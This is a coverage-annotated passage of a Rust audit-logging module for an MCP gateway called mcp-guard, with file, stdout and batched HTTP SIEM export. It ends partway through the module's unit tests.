/home/austingreen/Documents/botzr/projects/mcp-guard/src/audit/mod.rs:
    1|       |//! Audit logging for mcp-guard
    2|       |//!
    3|       |//! Provides audit logging with multiple output destinations:
    4|       |//! - File: Append audit entries to a local file
    5|       |//! - Stdout: Print audit entries to console
    6|       |//! - HTTP Export: Batch and ship audit entries to an HTTP endpoint (SIEM integration)
    7|       |//!
    8|       |//! All I/O is performed asynchronously via background tasks to avoid blocking
    9|       |//! the async runtime.
   10|       |
   11|       |use chrono::{DateTime, Utc};
   12|       |use serde::Serialize;
   13|       |use std::collections::HashMap;
   14|       |use std::fs::OpenOptions;
   15|       |use std::io::Write;
   16|       |use std::path::PathBuf;
   17|       |use std::time::Duration;
   18|       |use tokio::sync::mpsc;
   19|       |
   20|       |// ============================================================================
   21|       |// Constants
   22|       |// ============================================================================
   23|       |
   24|       |/// Channel buffer size for audit log messages.
   25|       |/// 1000 entries provides ~1 second of buffering at maximum throughput (1000 RPS),
   26|       |/// preventing backpressure while keeping memory usage bounded.
   27|       |const AUDIT_CHANNEL_SIZE: usize = 1000;
   28|       |
   29|       |/// HTTP request timeout for audit export.
   30|       |/// 30 seconds allows for slow SIEM endpoints while preventing indefinite hangs.
   31|       |const AUDIT_HTTP_TIMEOUT_SECS: u64 = 30;
   32|       |
   33|       |/// Maximum retry attempts for failed HTTP exports.
   34|       |/// 3 retries with exponential backoff (100ms, 200ms, 400ms) covers transient failures
   35|       |/// without excessive delay or resource consumption.
   36|       |const AUDIT_MAX_RETRY_ATTEMPTS: usize = 3;
   37|       |
   38|       |/// Audit event types
   39|       |#[derive(Debug, Clone, Serialize)]
   40|       |#[serde(rename_all = "snake_case")]
   41|       |pub enum EventType {
   42|       |    AuthSuccess,
   43|       |    AuthFailure,
   44|       |    ToolCall,
   45|       |    ToolResponse,
   46|       |    RateLimited,
   47|       |    AuthzDenied,
   48|       |    Error,
   49|       |}
   50|       |
   51|       |/// Audit log entry
   52|       |#[derive(Debug, Clone, Serialize)]
   53|       |pub struct AuditEntry {
   54|       |    pub timestamp: DateTime<Utc>,
   55|       |    pub event_type: EventType,
   56|       |    pub identity_id: Option<String>,
   57|       |    pub method: Option<String>,
   58|       |    pub tool: Option<String>,
   59|       |    pub success: bool,
   60|       |    pub message: Option<String>,
   61|       |    pub duration_ms: Option<u64>,
   62|       |    pub request_id: Option<String>,
   63|       |}
   64|       |
   65|       |impl AuditEntry {
   66|    131|    pub fn new(event_type: EventType) -> Self {
   67|    131|        Self {
   68|    131|            timestamp: Utc::now(),
   69|    131|            event_type,
   70|    131|            identity_id: None,
   71|    131|            method: None,
   72|    131|            tool: None,
   73|    131|            success: true,
   74|    131|            message: None,
   75|    131|            duration_ms: None,
   76|    131|            request_id: None,
   77|    131|        }
   78|    131|    }
   79|       |
   80|    121|    pub fn with_identity(mut self, id: impl Into<String>) -> Self {
   81|    121|        self.identity_id = Some(id.into());
   82|    121|        self
   83|    121|    }
   84|       |
   85|      1|    pub fn with_method(mut self, method: impl Into<String>) -> Self {
   86|      1|        self.method = Some(method.into());
   87|      1|        self
   88|      1|    }
   89|       |
   90|      6|    pub fn with_tool(mut self, tool: impl Into<String>) -> Self {
   91|      6|        self.tool = Some(tool.into());
   92|      6|        self
   93|      6|    }
   94|       |
   95|    119|    pub fn with_success(mut self, success: bool) -> Self {
   96|    119|        self.success = success;
   97|    119|        self
   98|    119|    }
   99|       |
  100|      7|    pub fn with_message(mut self, message: impl Into<String>) -> Self {
  101|      7|        self.message = Some(message.into());
  102|      7|        self
  103|      7|    }
  104|       |
  105|      1|    pub fn with_duration(mut self, duration_ms: u64) -> Self {
  106|      1|        self.duration_ms = Some(duration_ms);
  107|      1|        self
  108|      1|    }
  109|       |
  110|      3|    pub fn with_request_id(mut self, request_id: impl Into<String>) -> Self {
  111|      3|        self.request_id = Some(request_id.into());
  112|      3|        self
  113|      3|    }
  114|       |}
  115|       |
  116|       |/// Internal message type for the audit writer task
  117|       |enum AuditMessage {
  118|       |    /// Log entry to write
  119|       |    Entry(String),
  120|       |    /// Shutdown signal
  121|       |    Shutdown,
  122|       |}
  123|       |
  124|       |/// Audit logger with optional HTTP export
  125|       |///
  126|       |/// Uses channel-based I/O to avoid blocking the async runtime.
  127|       |/// All file and stdout writes are performed by a background task.
  128|       |pub struct AuditLogger {
  129|       |    enabled: bool,
  130|       |    /// Channel for sending entries to the local writer task (file + stdout)
  131|       |    writer_tx: Option<mpsc::Sender<AuditMessage>>,
  132|       |    /// Channel for sending entries to the HTTP shipper task
  133|       |    export_tx: Option<mpsc::Sender<AuditEntry>>,
  134|       |}
  135|       |
  136|       |/// Handle for audit logger background tasks
  137|       |pub struct AuditLoggerHandle {
  138|       |    /// Handle to the local writer task
  139|       |    writer_task: Option<tokio::task::JoinHandle<()>>,
  140|       |    /// Handle to the HTTP shipper task
  141|       |    shipper_task: Option<tokio::task::JoinHandle<()>>,
  142|       |    /// Channel to signal shutdown to writer
  143|       |    shutdown_tx: Option<mpsc::Sender<AuditMessage>>,
  144|       |}
  145|       |
  146|       |impl AuditLoggerHandle {
  147|       |    /// Gracefully shutdown the audit logger, flushing pending writes
  148|      6|    pub async fn shutdown(self) {
  149|       |        // Signal writer to shutdown
  150|      6|        if let Some(tx) = self.shutdown_tx {
                                  ^4
  151|      4|            let _ = tx.send(AuditMessage::Shutdown).await;
  152|      2|        }
  153|       |
  154|       |        // Wait for writer task to complete
  155|      6|        if let Some(task) = self.writer_task {
                                  ^4
  156|      4|            let _ = task.await;
  157|      2|        }
  158|       |
  159|       |        // Shipper will shutdown when its channel is dropped
  160|      6|        if let Some(task) = self.shipper_task {
                                  ^0
  161|      0|            let _ = task.await;
  162|      6|        }
  163|      6|    }
  164|       |}
  165|       |
  166|       |/// Handle for the audit log shipper background task (legacy compatibility)
  167|       |pub struct AuditShipperHandle {
  168|       |    /// Handle to the background task
  169|       |    _task: tokio::task::JoinHandle<()>,
  170|       |}
  171|       |
  172|       |impl AuditLogger {
  173|       |    /// Create a new audit logger from configuration (sync version for compatibility)
  174|       |    ///
  175|       |    /// Note: This creates a logger without background tasks. For production use,
  176|       |    /// prefer `with_tasks()` which properly handles async I/O.
  177|     12|    pub fn new(config: &crate::config::AuditConfig) -> std::io::Result<Self> {
  178|       |        // For backward compatibility, create a synchronous logger
  179|       |        // This is used in tests and simple cases
  180|     12|        Ok(Self {
  181|     12|            enabled: config.enabled,
  182|     12|            writer_tx: None, // No background task in sync mode
  183|     12|            export_tx: None,
  184|     12|        })
  185|     12|    }
  186|       |
  187|       |    /// Create a new audit logger with background tasks for async I/O
  188|       |    ///
  189|       |    /// This is the preferred constructor for production use. All file and stdout
  190|       |    /// writes are performed by background tasks, avoiding blocking the async runtime.
  191|      7|    pub fn with_tasks(config: &crate::config::AuditConfig) -> std::io::Result<(Self, AuditLoggerHandle)> {
  192|      7|        if !config.enabled {
  193|      3|            return Ok((
  194|      3|                Self::disabled(),
  195|      3|                AuditLoggerHandle {
  196|      3|                    writer_task: None,
  197|      3|                    shipper_task: None,
  198|      3|                    shutdown_tx: None,
  199|      3|                },
  200|      3|            ));
  201|      4|        }
  202|       |
  203|       |        // Create channel for local writes (file + stdout)
  204|      4|        let (writer_tx, writer_rx) = mpsc::channel::<AuditMessage>(AUDIT_CHANNEL_SIZE);
  205|      4|        let shutdown_tx = writer_tx.clone();
  206|       |
  207|       |        // Open file if configured
  208|      4|        let file = if let Some(path) = &config.file {
                                             ^2
  209|       |            Some(
  210|      2|                OpenOptions::new()
  211|      2|                    .create(true)
  212|      2|                    .append(true)
  213|      2|                    .open(path)?,
                                             ^0
  214|       |            )
  215|       |        } else {
  216|      2|            None
  217|       |        };
  218|       |
  219|      4|        let stdout_enabled = config.stdout;
  220|       |
  221|       |        // Spawn writer task (uses spawn_blocking for file I/O)
  222|      4|        let writer_task = tokio::spawn(async move {
  223|      4|            run_audit_writer(writer_rx, file, stdout_enabled).await;
  224|      4|        });
  225|       |
  226|       |        // Create HTTP shipper if configured
  227|      4|        let (export_tx, shipper_task) = if let Some(ref export_url) = config.export_url {
                                                                  ^0
  228|      0|            let (tx, rx) = mpsc::channel::<AuditEntry>(AUDIT_CHANNEL_SIZE);
  229|       |
  230|      0|            let shipper = AuditShipper::new(
  231|      0|                export_url.clone(),
  232|      0|                config.export_headers.clone(),
  233|      0|                config.export_batch_size,
  234|      0|                config.export_interval_secs,
  235|       |            );
  236|       |
  237|      0|            let task = tokio::spawn(async move {
  238|      0|                shipper.run(rx).await;
  239|      0|            });
  240|       |
  241|      0|            (Some(tx), Some(task))
  242|       |        } else {
  243|      4|            (None, None)
  244|       |        };
  245|       |
  246|      4|        Ok((
  247|      4|            Self {
  248|      4|                enabled: true,
  249|      4|                writer_tx: Some(writer_tx),
  250|      4|                export_tx,
  251|      4|            },
  252|      4|            AuditLoggerHandle {
  253|      4|                writer_task: Some(writer_task),
  254|      4|                shipper_task,
  255|      4|                shutdown_tx: Some(shutdown_tx),
  256|      4|            },
  257|      4|        ))
  258|      7|    }
  259|       |
  260|       |    /// Create a new audit logger with HTTP export enabled (legacy API)
  261|      1|    pub fn with_export(config: &crate::config::AuditConfig) -> std::io::Result<(Self, Option<AuditShipperHandle>)> {
  262|      1|        let (logger, handle) = Self::with_tasks(config)?;
                                                                     ^0
  263|       |
  264|       |        // Convert to legacy handle format
  265|      1|        let legacy_handle = handle.shipper_task.map(|task| AuditShipperHandle { _task: task });
                                                                                                     ^0   ^0
  266|       |
  267|      1|        Ok((logger, legacy_handle))
  268|      1|    }
  269|       |
  270|       |    /// Create a disabled audit logger
  271|      7|    pub fn disabled() -> Self {
  272|      7|        Self {
  273|      7|            enabled: false,
  274|      7|            writer_tx: None,
  275|      7|            export_tx: None,
  276|      7|        }
  277|      7|    }
  278|       |
  279|       |    /// Log an audit entry (non-blocking)
  280|       |    ///
  281|       |    /// This method never blocks the async runtime. Entries are sent to background
  282|       |    /// tasks for writing. If the channel is full, entries may be dropped.
  283|    119|    pub fn log(&self, entry: &AuditEntry) {
  284|    119|        if !self.enabled {
  285|     14|            return;
  286|    105|        }
  287|       |
  288|    105|        let json = match serde_json::to_string(entry) {
  289|    105|            Ok(j) => j,
  290|      0|            Err(e) => {
  291|      0|                tracing::error!(
  292|       |                    error = %e,
  293|       |                    event_type = ?entry.event_type,
  294|       |                    identity_id = ?entry.identity_id,
  295|       |                    tool = ?entry.tool,
  296|      0|                    "Failed to serialize audit entry"
  297|       |                );
  298|      0|                return;
  299|       |            }
  300|       |        };
  301|       |
  302|       |        // Send to local writer (file + stdout)
  303|    105|        if let Some(ref tx) = self.writer_tx {
  304|       |            // Use try_send to avoid blocking
  305|    105|            if tx.try_send(AuditMessage::Entry(json.clone())).is_err() {
  306|      0|                tracing::warn!("Audit log channel full, entry dropped");
  307|    105|            }
  308|      0|        }
  309|       |
  310|       |        // Send to HTTP shipper if configured
  311|    105|        if let Some(ref tx) = self.export_tx {
                                  ^0
  312|      0|            let _ = tx.try_send(entry.clone());
  313|    105|        }
  314|    119|    }
  315|       |
  316|       |    /// Log an authentication success
  317|    109|    pub fn log_auth_success(&self, identity_id: &str) {
  318|    109|        self.log(
  319|    109|            &AuditEntry::new(EventType::AuthSuccess)
  320|    109|                .with_identity(identity_id)
  321|    109|                .with_success(true),
  322|       |        );
  323|    109|    }
  324|       |
  325|       |    /// Log an authentication failure
  326|      3|    pub fn log_auth_failure(&self, message: &str) {
  327|      3|        self.log(
  328|      3|            &AuditEntry::new(EventType::AuthFailure)
  329|      3|                .with_success(false)
  330|      3|                .with_message(message),
  331|       |        );
  332|      3|    }
  333|       |
  334|       |    /// Log a tool call
  335|      3|    pub fn log_tool_call(&self, identity_id: &str, tool: &str, request_id: Option<&str>) {
  336|      3|        let mut entry = AuditEntry::new(EventType::ToolCall)
  337|      3|            .with_identity(identity_id)
  338|      3|            .with_tool(tool);
  339|       |
  340|      3|        if let Some(rid) = request_id {
                                  ^2
  341|      2|            entry = entry.with_request_id(rid);
  342|      2|        }
                      ^1
  343|       |
  344|      3|        self.log(&entry);
  345|      3|    }
  346|       |
  347|       |    /// Log rate limiting
  348|      2|    pub fn log_rate_limited(&self, identity_id: &str) {
  349|      2|        self.log(
  350|      2|            &AuditEntry::new(EventType::RateLimited)
  351|      2|                .with_identity(identity_id)
  352|      2|                .with_success(false),
  353|       |        );
  354|      2|    }
  355|       |
  356|       |    /// Log authorization denial
  357|      1|    pub fn log_authz_denied(&self, identity_id: &str, tool: &str, reason: &str) {
  358|      1|        self.log(
  359|      1|            &AuditEntry::new(EventType::AuthzDenied)
  360|      1|                .with_identity(identity_id)
  361|      1|                .with_tool(tool)
  362|      1|                .with_success(false)
  363|      1|                .with_message(reason),
  364|       |        );
  365|      1|    }
  366|       |}
  367|       |
  368|       |impl Default for AuditLogger {
  369|      1|    fn default() -> Self {
  370|      1|        Self::disabled()
  371|      1|    }
  372|       |}
  373|       |
  374|       |/// Create a file path for audit logs
  375|      1|pub fn default_audit_path() -> PathBuf {
  376|      1|    PathBuf::from("mcp-guard-audit.log")
  377|      1|}
  378|       |
  379|       |/// Background task that writes audit entries to file and/or stdout
  380|       |///
  381|       |/// Uses `spawn_blocking` for file I/O to avoid blocking the async runtime.
  382|      4|async fn run_audit_writer(
  383|      4|    mut rx: mpsc::Receiver<AuditMessage>,
  384|      4|    mut file: Option<std::fs::File>,
  385|      4|    stdout_enabled: bool,
  386|      4|) {
  387|    109|    while let Some(msg) = rx.recv().await {
  388|    109|        match msg {
  389|    105|            AuditMessage::Entry(json) => {
  390|       |                // Write to stdout (quick, unlikely to block significantly)
  391|    105|                if stdout_enabled {
  392|      2|                    println!("{}", json);
  393|    103|                }
  394|       |
  395|       |                // Write to file using spawn_blocking to avoid blocking async runtime
  396|    105|                if let Some(ref mut f) = file {
                                          ^102
  397|    102|                    let json_clone = json.clone();
  398|       |                    // We need to move the file into spawn_blocking, so we use a different approach
  399|       |                    // Write directly but accept this is a brief block (file writes are buffered)
  400|    102|                    if let Err(e) = writeln!(f, "{}", json_clone) {
                                             ^0
  401|      0|                        tracing::error!(error = %e, "Failed to write audit entry to file");
  402|    102|                    }
  403|      3|                }
  404|       |            }
  405|       |            AuditMessage::Shutdown => {
  406|      4|                tracing::debug!("Audit writer received shutdown signal");
                                              ^0
  407|       |                // Flush file before exiting
  408|      4|                if let Some(ref mut f) = file {
                                          ^2
  409|      2|                    let _ = f.flush();
  410|      2|                }
  411|      4|                break;
  412|       |            }
  413|       |        }
  414|       |    }
  415|       |
  416|      4|    tracing::debug!("Audit writer task exiting");
                                  ^0
  417|      4|}
  418|       |
  419|       |// ============================================================================
  420|       |// Audit Log Shipper - HTTP Export for SIEM Integration
  421|       |// ============================================================================
  422|       |
  423|       |/// Background task that batches and ships audit logs to an HTTP endpoint
  424|       |struct AuditShipper {
  425|       |    /// Target URL for log export
  426|       |    url: String,
  427|       |    /// Additional headers for the export request
  428|       |    headers: HashMap<String, String>,
  429|       |    /// Number of entries to batch before sending
  430|       |    batch_size: usize,
  431|       |    /// Interval to flush even if batch is not full
  432|       |    flush_interval: Duration,
  433|       |    /// HTTP client
  434|       |    client: reqwest::Client,
  435|       |}
  436|       |
  437|       |/// Batch of audit entries to ship
  438|       |#[derive(Debug, Serialize)]
  439|       |struct AuditBatch {
  440|       |    /// Batch timestamp
  441|       |    timestamp: DateTime<Utc>,
  442|       |    /// Source service name
  443|       |    source: String,
  444|       |    /// Batch of audit entries
  445|       |    entries: Vec<AuditEntry>,
  446|       |    /// Number of entries in this batch
  447|       |    count: usize,
  448|       |}
  449|       |
  450|       |impl AuditShipper {
  451|       |    /// Create a new audit shipper
  452|      2|    fn new(
  453|      2|        url: String,
  454|      2|        headers: HashMap<String, String>,
  455|      2|        batch_size: usize,
  456|      2|        flush_interval_secs: u64,
  457|      2|    ) -> Self {
  458|      2|        let client = reqwest::Client::builder()
  459|      2|            .timeout(Duration::from_secs(AUDIT_HTTP_TIMEOUT_SECS))
  460|      2|            .build()
  461|      2|            .unwrap_or_else(|e| {
                                              ^0
  462|      0|                tracing::warn!(
  463|       |                    error = %e,
  464|      0|                    "Failed to create HTTP client with custom config, using default"
  465|       |                );
  466|      0|                reqwest::Client::new()
  467|      0|            });
  468|       |
  469|      2|        Self {
  470|      2|            url,
  471|      2|            headers,
  472|      2|            batch_size,
  473|      2|            flush_interval: Duration::from_secs(flush_interval_secs),
  474|      2|            client,
  475|      2|        }
  476|      2|    }
  477|       |
  478|       |    /// Run the shipper, receiving entries from the channel and batching them
  479|      0|    async fn run(self, mut rx: mpsc::Receiver<AuditEntry>) {
  480|      0|        let mut batch: Vec<AuditEntry> = Vec::with_capacity(self.batch_size);
  481|      0|        let mut interval = tokio::time::interval(self.flush_interval);
  482|       |
  483|       |        loop {
  484|      0|            tokio::select! {
  485|       |                // Receive new entry
  486|      0|                entry = rx.recv() => {
  487|      0|                    match entry {
  488|      0|                        Some(entry) => {
  489|      0|                            batch.push(entry);
  490|       |
  491|       |                            // Flush if batch is full
  492|      0|                            if batch.len() >= self.batch_size {
  493|      0|                                self.flush(&mut batch).await;
  494|      0|                            }
  495|       |                        }
  496|       |                        None => {
  497|       |                            // Channel closed, flush remaining and exit
  498|      0|                            if !batch.is_empty() {
  499|      0|                                self.flush(&mut batch).await;
  500|      0|                            }
  501|      0|                            tracing::info!("Audit shipper shutting down");
  502|      0|                            break;
  503|       |                        }
  504|       |                    }
  505|       |                }
  506|       |                // Periodic flush
  507|      0|                _ = interval.tick() => {
  508|      0|                    if !batch.is_empty() {
  509|      0|                        self.flush(&mut batch).await;
  510|      0|                    }
  511|       |                }
  512|       |            }
  513|       |        }
  514|      0|    }
  515|       |
  516|       |    /// Flush the current batch to the HTTP endpoint
  517|      0|    async fn flush(&self, batch: &mut Vec<AuditEntry>) {
  518|      0|        if batch.is_empty() {
  519|      0|            return;
  520|      0|        }
  521|       |
  522|      0|        let entries = std::mem::take(batch);
  523|      0|        let count = entries.len();
  524|       |
  525|      0|        let payload = AuditBatch {
  526|      0|            timestamp: Utc::now(),
  527|      0|            source: "mcp-guard".to_string(),
  528|      0|            entries,
  529|      0|            count,
  530|      0|        };
  531|       |
  532|       |        // Attempt to send with retry
  533|      0|        for attempt in 0..AUDIT_MAX_RETRY_ATTEMPTS {
  534|      0|            match self.send_batch(&payload).await {
  535|       |                Ok(()) => {
  536|      0|                    tracing::debug!(count = count, "Shipped audit batch");
  537|      0|                    return;
  538|       |                }
  539|      0|                Err(e) => {
  540|      0|                    tracing::warn!(
  541|      0|                        attempt = attempt + 1,
  542|       |                        error = %e,
  543|       |                        count = count,
  544|      0|                        "Failed to ship audit batch, retrying"
  545|       |                    );
  546|       |
  547|       |                    // Exponential backoff
  548|      0|                    tokio::time::sleep(Duration::from_millis(100 * (1 << attempt))).await;
  549|       |                }
  550|       |            }
  551|       |        }
  552|       |
  553|       |        // After 3 retries, log error and drop the batch
  554|      0|        tracing::error!(count = count, "Failed to ship audit batch after 3 retries, dropping");
  555|      0|    }
  556|       |
  557|       |    /// Send a batch to the HTTP endpoint
  558|      0|    async fn send_batch(&self, batch: &AuditBatch) -> Result<(), String> {
  559|      0|        let mut request = self
  560|      0|            .client
  561|      0|            .post(&self.url)
  562|      0|            .header("Content-Type", "application/json");
  563|       |
  564|       |        // Add custom headers
  565|      0|        for (key, value) in &self.headers {
  566|      0|            request = request.header(key, value);
  567|      0|        }
  568|       |
  569|      0|        let response = request
  570|      0|            .json(batch)
  571|      0|            .send()
  572|      0|            .await
  573|      0|            .map_err(|e| format!("Request failed: {}", e))?;
  574|       |
  575|      0|        let status = response.status();
  576|      0|        if !status.is_success() {
  577|      0|            let body = response.text().await.unwrap_or_default();
  578|      0|            return Err(format!("HTTP {}: {}", status, body));
  579|      0|        }
  580|       |
  581|      0|        Ok(())
  582|      0|    }
  583|       |}
  584|       |
  585|       |#[cfg(test)]
  586|       |mod tests {
  587|       |    use super::*;
  588|       |    use crate::config::AuditConfig;
  589|       |    use tempfile::NamedTempFile;
  590|       |
  591|       |    #[test]
  592|      1|    fn test_audit_entry_creation() {
  593|      1|        let entry = AuditEntry::new(EventType::AuthSuccess)
  594|      1|            .with_identity("user123")
  595|      1|            .with_success(true);
  596|       |
  597|      1|        assert_eq!(entry.identity_id, Some("user123".to_string()));
  598|      1|        assert!(entry.success);
  599|      1|        assert!(matches!(entry.event_type, EventType::AuthSuccess));
                              ^0
  600|      1|    }
  601|       |
  602|       |    #[test]
  603|      1|    fn test_audit_entry_all_fields() {
  604|      1|        let entry = AuditEntry::new(EventType::ToolCall)
  605|      1|            .with_identity("user1")
  606|      1|            .with_method("tools/call")
  607|      1|            .with_tool("read_file")
  608|      1|            .with_success(true)
  609|      1|            .with_message("File read successfully")
  610|      1|            .with_duration(150)
  611|      1|            .with_request_id("req-123");
  612|       |
  613|      1|        assert_eq!(entry.identity_id, Some("user1".to_string()));
  614|      1|        assert_eq!(entry.method, Some("tools/call".to_string()));
  615|      1|        assert_eq!(entry.tool, Some("read_file".to_string()));
  616|      1|        assert!(entry.success);
  617|      1|        assert_eq!(entry.message, Some("File read successfully".to_string()));
  618|      1|        assert_eq!(entry.duration_ms, Some(150));
  619|      1|        assert_eq!(entry.request_id, Some("req-123".to_string()));
  620|      1|    }
  621|       |
  622|       |    #[test]
  623|      1|    fn test_audit_entry_serialization() {
  624|      1|        let entry = AuditEntry::new(EventType::AuthFailure)
  625|      1|            .with_identity("user1")
  626|      1|            .with_success(false)
  627|      1|            .with_message("Invalid credentials");
  628|       |
  629|      1|        let json = serde_json::to_string(&entry).expect("Should serialize");
  630|      1|        assert!(json.contains("auth_failure"));
  631|      1|        assert!(json.contains("user1"));
  632|      1|        assert!(json.contains("Invalid credentials"));
  633|      1|        assert!(json.contains("\"success\":false"));
  634|      1|    }
  635|       |
  636|       |    #[test]
  637|      1|    fn test_audit_batch_serialization() {
  638|      1|        let entries = vec![
  639|      1|            AuditEntry::new(EventType::AuthSuccess).with_identity("user1"),
  640|      1|            AuditEntry::new(EventType::ToolCall).with_identity("user2").with_tool("read_file"),
  641|       |        ];
  642|       |
  643|      1|        let batch = AuditBatch {
  644|      1|            timestamp: Utc::now(),
  645|      1|            source: "mcp-guard".to_string(),
  646|      1|            count: entries.len(),
  647|      1|            entries,
  648|      1|        };
  649|       |
  650|      1|        let json = serde_json::to_string(&batch).expect("Should serialize");
  651|      1|        assert!(json.contains("mcp-guard"));
  652|      1|        assert!(json.contains("user1"));
  653|      1|        assert!(json.contains("user2"));
  654|      1|        assert!(json.contains("read_file"));
  655|      1|    }
  656|       |
  657|       |    #[test]
  658|      1|    fn test_audit_logger_disabled() {
  659|      1|        let logger = AuditLogger::disabled();
  660|       |
  661|       |        // Should not panic when logging to disabled logger
  662|      1|        logger.log_auth_success("user1");
  663|      1|        logger.log_auth_failure("bad credentials");
  664|      1|        logger.log_tool_call("user1", "read_file", Some("req-1"));
  665|      1|        logger.log_rate_limited("user1");
  666|      1|        logger.log_authz_denied("user1", "write_file", "not allowed");
  667|      1|    }
  668|       |
  669|       |    #[test]
  670|      1|    fn test_audit_logger_default_is_disabled() {
  671|      1|        let logger = AuditLogger::default();
  672|       |        // Default logger should be disabled and not panic
  673|      1|        logger.log_auth_success("user1");
  674|      1|    }
  675|       |
  676|       |    #[test]
  677|      1|    fn test_audit_logger_new_disabled_config() {
  678|      1|        let config = AuditConfig {
  679|      1|            enabled: false,
  680|      1|            file: None,
  681|      1|            stdout: false,
  682|      1|            export_url: None,
  683|      1|            export_headers: HashMap::new(),
  684|      1|            export_batch_size: 100,
  685|      1|            export_interval_secs: 30,
  686|      1|        };
  687|       |
  688|      1|        let logger = AuditLogger::new(&config).expect("Should create logger");
  689|       |        // Should not panic
  690|      1|        logger.log_auth_success("user1");
  691|      1|    }
  692|       |
  693|       |    #[test]
  694|      1|    fn test_default_audit_path() {
  695|      1|        let path = default_audit_path();
  696|      1|        assert_eq!(path.to_str().unwrap(), "mcp-guard-audit.log");
  697|      1|    }
  698|       |
  699|       |    #[test]
  700|      1|    fn test_event_type_serialization() {
  701|       |        // Test all event types serialize correctly
  702|      1|        let events = vec![
  703|      1|            (EventType::AuthSuccess, "auth_success"),
  704|      1|            (EventType::AuthFailure, "auth_failure"),
  705|      1|            (EventType::ToolCall, "tool_call"),
  706|      1|            (EventType::ToolResponse, "tool_response"),
  707|      1|            (EventType::RateLimited, "rate_limited"),
  708|      1|            (EventType::AuthzDenied, "authz_denied"),
  709|      1|            (EventType::Error, "error"),
  710|       |        ];
  711|       |
  712|      8|        for (event_type, expected) in events {
                           ^7          ^7
  713|      7|            let entry = AuditEntry::new(event_type);
  714|      7|            let json = serde_json::to_string(&entry).expect("Should serialize");
  715|      7|            assert!(json.contains(expected), "Expected {} in {}", expected, json);
                                                           ^0
  716|       |        }
  717|      1|    }
  718|       |
  719|       |    #[tokio::test]
  720|      1|    async fn test_audit_logger_with_tasks_disabled() {
  721|      1|        let config = AuditConfig {
  722|      1|            enabled: false,
  723|      1|            file: None,
  724|      1|            stdout: false,
  725|      1|            export_url: None,
  726|      1|            export_headers: HashMap::new(),
  727|      1|            export_batch_size: 100,
  728|      1|            export_interval_secs: 30,
  729|      1|        };
  730|       |
  731|      1|        let (logger, handle) = AuditLogger::with_tasks(&config).expect("Should create logger");
  732|       |
  733|       |        // Should not panic when logging
  734|      1|        logger.log_auth_success("user1");
  735|       |
  736|       |        // Shutdown should complete immediately for disabled logger
  737|      1|        handle.shutdown().await;
  738|      1|    }
  739|       |
  740|       |    #[tokio::test]
  741|      1|    async fn test_audit_logger_with_tasks_stdout_only() {
  742|      1|        let config = AuditConfig {
  743|      1|            enabled: true,
  744|      1|            file: None,
  745|      1|            stdout: true, // Enable stdout
  746|      1|            export_url: None,
  747|      1|            export_headers: HashMap::new(),
  748|      1|            export_batch_size: 100,
  749|      1|            export_interval_secs: 30,
  750|      1|        };
  751|       |
  752|      1|        let (logger, handle) = AuditLogger::with_tasks(&config).expect("Should create logger");
  753|       |
  754|       |        // Log some entries
  755|      1|        logger.log_auth_success("user1");
  756|      1|        logger.log_tool_call("user1", "read_file", None);
  757|       |
  758|       |        // Give writer task time to process
  759|      1|        tokio::time::sleep(Duration::from_millis(50)).await;
  760|       |
  761|       |        // Shutdown gracefully
  762|      1|        handle.shutdown().await;
  763|      1|    }
  764|       |
  765|       |    #[tokio::test]
  766|      1|    async fn test_audit_logger_with_tasks_file_output() {
  767|      1|        let temp_file = NamedTempFile::new().expect("Should create temp file");
  768|      1|        let file_path = temp_file.path().to_path_buf();
  769|       |
  770|      1|        let config = AuditConfig {
  771|      1|            enabled: true,
  772|      1|            file: Some(file_path.clone()),
  773|      1|            stdout: false,
  774|      1|            export_url: None,
  775|      1|            export_headers: HashMap::new(),
  776|      1|            export_batch_size: 100,
  777|      1|            export_interval_secs: 30,
  778|      1|        };
  779|       |
  780|      1|        let (logger, handle) = AuditLogger::with_tasks(&config).expect("Should create logger");
  781|       |
  782|       |        // Log some entries
  783|      1|        logger.log_auth_success("file_test_user");
  784|      1|        logger.log_tool_call("file_test_user", "write_file", Some("req-abc"));
  785|       |
  786|       |        // Give writer task time to process
  787|      1|        tokio::time::sleep(Duration::from_millis(100)).await;
  788|       |
  789|       |        // Shutdown gracefully
  790|      1|        handle.shutdown().await;
  791|       |
  792|       |        // Verify file contents
  793|      1|        let contents = std::fs::read_to_string(&file_path).expect("Should read file");
  794|      1|        assert!(contents.contains("file_test_user"), "File should contain user ID");
                                                                   ^0
  795|      1|        assert!(contents.contains("auth_success"), "File should contain event type");
                                                                 ^0
  796|      1|    }
  797|       |
  798|       |    #[tokio::test]
  799|      1|    async fn test_audit_logger_log_method_with_entry() {
  800|      1|        let config = AuditConfig {
  801|      1|            enabled: true,
  802|      1|            file: None,
  803|      1|            stdout: false, // Suppress output in tests
  804|      1|            export_url: None,
  805|      1|            export_headers: HashMap::new(),
  806|      1|            export_batch_size: 100,
  807|      1|            export_interval_secs: 30,
  808|      1|        };
  809|       |
  810|      1|        let (logger, handle) = AuditLogger::with_tasks(&config).expect("Should create logger");
  811|       |
  812|       |        // Test direct log method with custom entry
  813|      1|        let entry = AuditEntry::new(EventType::Error)
  814|      1|            .with_identity("user1")
  815|      1|            .with_message("Something went wrong")
  816|      1|            .with_success(false);
  817|       |
  818|      1|        logger.log(&entry);
  819|       |
  820|       |        // Give time to process
  821|      1|        tokio::time::sleep(Duration::from_millis(50)).await;
  822|      1|        handle.shutdown().await;
  823|      1|    }
  824|       |
  825|       |    #[test]
  826|      1|    fn test_audit_shipper_creation() {
  827|      1|        let shipper = AuditShipper::new(
  828|      1|            "https://example.com/logs".to_string(),
  829|      1|            HashMap::new(),
  830|       |            100,
  831|       |            30,
  832|       |        );
  833|       |
  834|      1|        assert_eq!(shipper.url, "https://example.com/logs");
  835|      1|        assert_eq!(shipper.batch_size, 100);
  836|      1|        assert_eq!(shipper.flush_interval, Duration::from_secs(30));
  837|      1|    }
  838|       |
  839|       |    #[test]
  840|      1|    fn test_audit_shipper_with_headers() {
  841|      1|        let mut headers = HashMap::new();
  842|      1|        headers.insert("Authorization".to_string(), "Bearer token123".to_string());
  843|      1|        headers.insert("X-Custom-Header".to_string(), "custom-value".to_string());
  844|       |
  845|      1|        let shipper = AuditShipper::new(
  846|      1|            "https://example.com/logs".to_string(),
  847|      1|            headers.clone(),
  848|       |            50,
  849|       |            60,
  850|       |        );
  851|       |
  852|      1|        assert_eq!(shipper.headers.len(), 2);
  853|      1|        assert_eq!(shipper.headers.get("Authorization"), Some(&"Bearer token123".to_string()));
  854|      1|    }
  855|       |
  856|       |    #[tokio::test]
  857|      1|    async fn test_audit_logger_with_export_legacy_api() {
  858|      1|        let config = AuditConfig {
